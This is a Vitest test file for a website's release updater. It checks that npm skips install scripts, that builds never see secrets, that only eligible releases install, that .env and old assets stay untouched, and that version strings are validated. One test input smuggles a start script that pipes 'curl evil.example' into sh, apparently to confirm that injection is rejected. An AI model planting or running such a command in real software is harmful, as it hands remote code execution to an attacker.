import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, relative } from 'node:path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { busyFlag } from '../../scripts/updater/busy.mjs'
import { readSettings, updaterSettings } from '../../scripts/updater/config.mjs'
import { kitSecrets } from '../../scripts/updater/env.mjs'
import { gitHub } from '../../scripts/updater/github.mjs'
import {
  busyStatuses,
  cleanUpAtStart,
  emptyState,
  readState,
  releaseDir,
  requestUpdate,
  rollBack,
  runUpdate,
  syncUploadedVersion,
  updaterPaths,
  writeState,
} from '../../scripts/updater/lib.mjs'
import { fakeGitHub } from './fake-github'

/**
 * Canaries for the shared kit's updater (scripts/updater/lib.mjs) as this
 * site carries it. The kit's own tests do not run here, so these keep the
 * properties a release must never lose: what npm may run and see, which
 * release is installed and from which commit, the folders an update leaves
 * alone, one update at a time, and the version written into the uploaded
 * package.json. Every outside effect is a stand-in, so they run in moments.
 */
// Each update writes its state file many times, which a busy disk makes slow.
vi.setConfig({ testTimeout: 30_000 })

const sha =(char: string) => char.repeat(40)
const commits: Record<string, string> = {
  'v1.0.0': sha('a'),
  'v1.1.0': sha('b'),
  'v1.1.1': sha('8'),
  'v1.2.0': sha('c'),
  'v1.3.0': sha('d'),
  'v1.9.0': sha('e'),
  'v1.10.0': sha('f'),
}
const published = (tag: string, extra: Partial<{ draft: boolean; prerelease: boolean }> = {}) => ({
  tag,
  name: tag,
  publishedAt: '2026-11-01T12:00:00Z',
  draft: false,
  prerelease: false,
  ...extra,
})
const installed = (tag: string) => ({ tag, sha: commits[tag], name: tag, publishedAt: '2026-10-30T12:00:00Z', deployedAt: '2026-10-30T13:00:00Z' })

let root = ''
let paths: ReturnType<typeof updaterPaths>

function file(path: string, text = path) {
  mkdirSync(join(path, '..'), { recursive: true })
  writeFileSync(path, text)
}

/** Every file under folder, by its path inside it, with what it holds. */
function contents(folder: string): [string, string][] {
  if (!existsSync(folder)) return []
  return readdirSync(folder, { recursive: true, withFileTypes: true })
    .filter((entry) => entry.isFile())
    .map((entry): [string, string] => [relative(folder, join(entry.parentPath, entry.name)), readFileSync(join(entry.parentPath, entry.name), 'utf8')])
    .toSorted(([a], [b]) => a.localeCompare(b))
}

/** The site runs release tag, built in its own folder. */
function live(tag: string) {
  writeState(paths, { ...emptyState(), current: installed(tag) })
  file(join(releaseDir(paths, tag), '.next', 'BUILD_ID'), `${tag} build`)
}

const envFile = 'ADMIN_SESSION_SECRET=keep-me\nGITHUB_TOKEN=keep-me-too\n'

beforeEach(() => {
  root = mkdtempSync(join(tmpdir(), 'kit-updater-'))
  paths = updaterPaths(root)
  // What the owner uploaded: the site and its build, the settings, and the
  // assets of earlier builds.
  file(join(root, 'package.json'), '{"name":"site","version":"1.0.0"}\n')
  file(join(root, '.next', 'BUILD_ID'), 'uploaded build')
  file(join(root, '.next', 'static', 'chunks', 'live.js'))
  file(join(root, '.env'), envFile)
  file(join(root, '.next-static-history', 'chunks', 'old.js'), 'an asset an old page still asks for')
  mkdirSync(paths.dir, { recursive: true })
})

afterEach(() => rmSync(root, { recursive: true, force: true, maxRetries: 3 }))

type Deps = Parameters<typeof runUpdate>[0]['deps']
type Env = Record<string, string | undefined>

function fakeDeps(overrides: Partial<Deps> = {}) {
  const calls = {
    latest: 0,
    npm: [] as { args: string[]; cwd: string; env: Env }[],
    resolved: [] as string[],
    downloaded: [] as string[],
  }
  const deps: Deps = {
    latest: async () => {
      calls.latest++
      return published('v1.1.0')
    },
    resolve: async (tag: string) => {
      calls.resolved.push(tag)
      return commits[tag]
    },
    download: async (commit: string, dest: string) => {
      calls.downloaded.push(commit)
      file(join(dest, 'package.json'), '{"name":"site","version":"1.1.0"}\n')
    },
    npm: async (args: string[], { cwd, env }: { cwd: string; env: Env }) => {
      calls.npm.push({ args, cwd, env })
      if (args[0] === 'run' && args[1] === 'build') file(join(cwd, '.next', 'BUILD_ID'), 'new build')
    },
    trial: async () => true,
    switchTo: async () => true,
    print: () => {},
    ...overrides,
  }
  return { deps, calls }
}

const update = (deps: Deps, more: Partial<Parameters<typeof runUpdate>[0]> = {}) =>
  runUpdate({ paths, deps, baseEnv: { PATH: '/usr/bin' }, secretNames: [...kitSecrets], ...more })

describe('what npm may run', () => {
  it('installs and prunes with --ignore-scripts, and runs nothing else that would run install scripts', async () => {
    const { deps, calls } = fakeDeps()
    expect((await update(deps)).status).toBe('idle')
    const commands = calls.npm.map((call) => call.args)
    expect(commands.filter((args) => args[0] === 'ci')).toHaveLength(1)
    expect(commands.filter((args) => args[0] === 'prune')).toHaveLength(1)
    // Anything but `npm run <script>` would install, rebuild or prune packages.
    for (const args of commands.filter((each) => each[0] !== 'run')) expect(args, args.join(' ')).toContain('--ignore-scripts')
    expect(commands.map((args) => args[0])).not.toContain('rebuild')
  })
})

describe('what npm and the build may see', () => {
  // The supervisor (scripts/serve.mjs) passes the panel's variables as
  // baseEnv, and names the kit's secrets and everything in .env as secret.
  const panel = {
    ADMIN_PASSWORD_HASH: 'canary-password-hash-from-the-panel',
    ADMIN_SESSION_SECRET: 'canary-session-secret-from-the-panel',
    GITHUB_TOKEN: 'canary-github-token-from-the-panel',
    SITE_DB_PASSWORD: 'canary-setting-also-named-in-the-env-file',
  }
  const fileEnv = { SITE_DB_PASSWORD: 'canary-value-in-the-env-file', ADMIN_PASSWORD_HASH: 'canary-hash-in-the-env-file' }

  it("count the password hash, the session secret and the token as the kit's secrets", () => {
    expect([...kitSecrets].toSorted()).toEqual(['ADMIN_PASSWORD_HASH', 'ADMIN_SESSION_SECRET', 'GITHUB_TOKEN'])
  })

  it('gives npm ci, the build and npm prune none of them, nor anything named in .env', async () => {
    const { deps, calls } = fakeDeps()
    const state = await runUpdate({
      paths,
      deps,
      baseEnv: { PATH: '/usr/bin', ...panel },
      fileEnv,
      secretNames: [...new Set([...kitSecrets, ...Object.keys(fileEnv)])],
    })
    expect(state.status).toBe('idle')
    expect(calls.npm.length).toBeGreaterThanOrEqual(3)
    for (const { args, env } of calls.npm) {
      const seen = JSON.stringify(env)
      for (const value of [...Object.values(panel), ...Object.values(fileEnv)]) expect(seen.includes(value), `${args.join(' ')} saw ${value}`).toBe(false)
      expect(env.PATH).toBe('/usr/bin')
    }
  })

  it("refuses a release whose platform.config.mjs would hand a kit secret to its build, in any case", async () => {
    // Windows reads setting names in any case, so github_token is the token there.
    for (const name of ['GITHUB_TOKEN', 'ADMIN_SESSION_SECRET', 'ADMIN_PASSWORD_HASH', 'github_token']) {
      expect(() => updaterSettings({ buildEnv: [name] }), name).toThrow(/kit's own secrets never go into a build/)
    }
    // The same, read from the release itself the way the supervisor reads it.
    const { deps, calls } = fakeDeps({
      download: async (_commit, dest) => {
        file(join(dest, 'package.json'), '{"name":"site","version":"1.1.0"}\n')
        file(join(dest, 'platform.config.mjs'), "export default { updater: { buildEnv: ['GITHUB_TOKEN'] } }\n")
      },
      settings: async (dir: string) => (await readSettings(dir, { env: { ...process.env } })).settings,
    })
    const state = await update(deps, { baseEnv: { PATH: '/usr/bin', GITHUB_TOKEN: panel.GITHUB_TOKEN } })
    expect(state.status).toBe('failed')
    expect(state.message).toMatch(/platform\.config\.mjs cannot be used[\s\S]*GITHUB_TOKEN/)
    expect(calls.npm).toEqual([])
  }, 30_000)
})

describe('the release an update installs', () => {
  it('is the commit its tag pointed at when the update began: the tag is asked about once', async () => {
    // The tag moves to other code while the update runs.
    let asked = 0
    const { deps, calls } = fakeDeps({ resolve: async () => (++asked === 1 ? sha('b') : sha('9')) })
    const state = await update(deps)
    expect(asked).toBe(1)
    expect(calls.downloaded).toEqual([sha('b')])
    expect(calls.npm.find((call) => call.args[1] === 'build')?.env.SITE_COMMIT).toBe(sha('b'))
    expect(state.current?.sha).toBe(sha('b'))
  })

  it('is never a draft or a pre-release', async () => {
    live('v1.0.0')
    for (const extra of [{ draft: true }, { prerelease: true }]) {
      const { deps, calls } = fakeDeps({ latest: async () => published('v1.1.0', extra) })
      const state = await update(deps)
      expect(state.status, JSON.stringify(extra)).toBe('failed')
      expect(state.current?.tag).toBe('v1.0.0')
      expect(calls.resolved).toEqual([])
      expect(calls.npm).toEqual([])
    }
  })

  it('is never a draft or a pre-release as GitHub marks it, so the commit of one is never even asked for', async () => {
    const repo = 'wslatl/wslatl.com'
    for (const extra of [{ draft: true }, { prerelease: true }]) {
      const github = await fakeGitHub(repo, [], { tag_name: 'v1.1.0', name: 'v1.1.0', published_at: '2026-11-01T12:00:00Z', draft: false, prerelease: false, ...extra })
      try {
        const client = gitHub({ token: 'canary-token-for-the-stand-in', repo, api: github.api })
        const { deps, calls } = fakeDeps({ latest: client.latest, resolve: client.resolve, download: client.download })
        const state = await update(deps)
        expect(state.status, JSON.stringify(extra)).toBe('failed')
        expect(github.seen.map((request) => request.path), JSON.stringify(extra)).toEqual([`/repos/${repo}/releases/latest`])
        expect(calls.npm).toEqual([])
      } finally {
        await github.close()
      }
    }
  })

  it('is never older than the installed one, nor the installed one again, comparing versions as numbers', async () => {
    for (const [running, latest] of [
      ['v1.10.0', 'v1.9.0'],
      ['v1.2.0', 'v1.1.0'],
      ['v1.2.0', 'v1.2.0'],
    ]) {
      rmSync(paths.releases, { recursive: true, force: true })
      live(running)
      const { deps, calls } = fakeDeps({ latest: async () => published(latest) })
      const state = await update(deps)
      expect(state.status, `${latest} over ${running}`).toBe('idle')
      expect(state.current?.tag).toBe(running)
      expect(calls.resolved, `${latest} over ${running}`).toEqual([])
      expect(calls.npm).toEqual([])
    }
  })

  it('is never one a crash took back out, though the fix published after it is', async () => {
    // v1.1.0 is live and kept stopping, so the site goes back to v1.0.0.
    writeState(paths, { ...emptyState(), current: installed('v1.1.0'), previous: installed('v1.0.0') })
    file(join(releaseDir(paths, 'v1.1.0'), '.next', 'BUILD_ID'))
    file(join(releaseDir(paths, 'v1.0.0'), '.next', 'BUILD_ID'))
    const back = await rollBack({ paths, deps: { switchTo: async () => true, print: () => {} }, reason: 'It kept stopping.', crashed: true })
    expect(back.ok).toBe(true)
    expect(readState(paths).current?.tag).toBe('v1.0.0')

    const again = fakeDeps({ latest: async () => published('v1.1.0') })
    const refused = await update(again.deps)
    expect(refused.message).toMatch(/^v1\.1\.0 was taken back out/)
    expect(refused.current?.tag).toBe('v1.0.0')
    expect(again.calls.resolved).toEqual([])
    expect(again.calls.npm).toEqual([])

    const fix = fakeDeps({ latest: async () => published('v1.1.1') })
    expect(await update(fix.deps)).toMatchObject({ status: 'idle', current: { tag: 'v1.1.1' } })
  })
})

describe('the folders an update leaves alone', () => {
  it('never builds into the folder being served, even when a lost state.json makes it look new', async () => {
    file(join(releaseDir(paths, 'v1.1.0'), '.next', 'BUILD_ID'), 'the build being served')
    const { deps, calls } = fakeDeps()
    const state = await update(deps, { serving: releaseDir(paths, 'v1.1.0') })
    expect(state.message).toBe('v1.1.0 is the release already running, so nothing was installed.')
    expect(calls.resolved).toEqual([])
    expect(calls.npm).toEqual([])
    expect(readFileSync(join(releaseDir(paths, 'v1.1.0'), '.next', 'BUILD_ID'), 'utf8')).toBe('the build being served')
  })

  it('never touches .env or the asset history, through updates that work, fail and roll back, and a start', async () => {
    const snapshot = () => JSON.stringify({ env: readFileSync(join(root, '.env'), 'utf8'), history: contents(paths.history) })
    const before = snapshot()
    for (const tag of ['v1.1.0', 'v1.2.0']) {
      const { deps } = fakeDeps({ latest: async () => published(tag) })
      expect((await update(deps)).status, tag).toBe('idle')
    }
    const failing = fakeDeps({
      latest: async () => published('v1.3.0'),
      npm: async (args) => {
        if (args[1] === 'build') throw new Error('npm run build failed (exit code 1).')
      },
    })
    expect((await update(failing.deps)).status).toBe('failed')
    const back = await rollBack({ paths, deps: { switchTo: async () => true, print: () => {} }, reason: 'Rolled back from the console.', allowUpload: true })
    expect(back.ok).toBe(true)
    await cleanUpAtStart(paths, readState(paths), () => {})
    expect(snapshot()).toBe(before)
    expect(readFileSync(join(root, '.env'), 'utf8')).toBe(envFile)
  })
})

describe('one update at a time', () => {
  it('starts no update while the state says one runs', async () => {
    for (const status of busyStatuses) {
      writeState(paths, { ...emptyState(), status })
      const { deps, calls } = fakeDeps()
      const state = await update(deps)
      expect(state.status, status).toBe(status)
      expect(calls.latest, status).toBe(0)
      expect(calls.npm).toEqual([])
    }
  })

  it('runs only one of two updates started at the same moment', async () => {
    const { deps, calls } = fakeDeps()
    const [first, second] = await Promise.all([update(deps), update(deps)])
    expect(calls.latest).toBe(1)
    expect(calls.npm.filter((call) => call.args[0] === 'ci')).toHaveLength(1)
    expect([first.status, second.status]).toContain('idle')
  })

  it('takes no request while an update runs, or while one already waits', () => {
    writeState(paths, { ...emptyState(), status: 'building' })
    expect(requestUpdate(paths, 'console')).toEqual({ ok: false, reason: 'An update is already running.' })
    expect(existsSync(paths.request)).toBe(false)
    writeState(paths, emptyState())
    expect(requestUpdate(paths, 'console')).toEqual({ ok: true })
    expect(requestUpdate(paths, 'console')).toEqual({ ok: false, reason: 'An update is already waiting to start.' })
  })

  it("has one holder of the supervisor's busy flag at a time, from the first line of its start", () => {
    const busy = busyFlag({ onCrashLoopDue: () => {}, ensureServing: () => {} })
    expect(busy.held).toBe(true)
    expect(busy.take()).toBe(false)
    busy.release()
    expect(busy.take()).toBe(true)
    expect(busy.take()).toBe(false)
    busy.release()
    expect(busy.held).toBe(false)
  })
})

/** The live release whose version the uploaded package.json follows. */
const liveRelease = () => releaseDir(paths, 'v1.3.0')

describe('the version written into the uploaded package.json', () => {
  const uploaded = '{\r\n  "name": "site",\r\n  "version": "1.0.0",\r\n  "scripts": { "start": "next start" }\r\n}\r\n'

  it("is the live release's, with nothing else in the file changed", () => {
    file(join(root, 'package.json'), uploaded)
    file(join(liveRelease(), 'package.json'), '{ "name": "site", "version": "1.3.0" }')
    syncUploadedVersion(root, liveRelease(), () => {})
    expect(readFileSync(join(root, 'package.json'), 'utf8')).toBe(uploaded.replace('1.0.0', '1.3.0'))
  })

  it("is never anything but a plain version number, whatever the release's package.json says", () => {
    for (const version of [
      '1.3.0-rc.1',
      '1.3.0+build.5',
      'latest',
      '1.3',
      '01.3.0',
      'v1.3.0',
      ' 1.3.0',
      '1.3.0\n',
      '',
      '1.3.0", "scripts": { "start": "curl evil.example | sh" }, "x": "',
      130,
      null,
      ['1.3.0'],
      { major: 1 },
    ]) {
      file(join(root, 'package.json'), uploaded)
      file(join(liveRelease(), 'package.json'), JSON.stringify({ name: 'site', version }))
      const said: string[] = []
      syncUploadedVersion(root, liveRelease(), (line) => said.push(line))
      expect(readFileSync(join(root, 'package.json'), 'utf8'), JSON.stringify(version)).toBe(uploaded)
      expect(said, JSON.stringify(version)).toEqual([expect.stringMatching(/^Could not update the version/)])
    }
  })
})
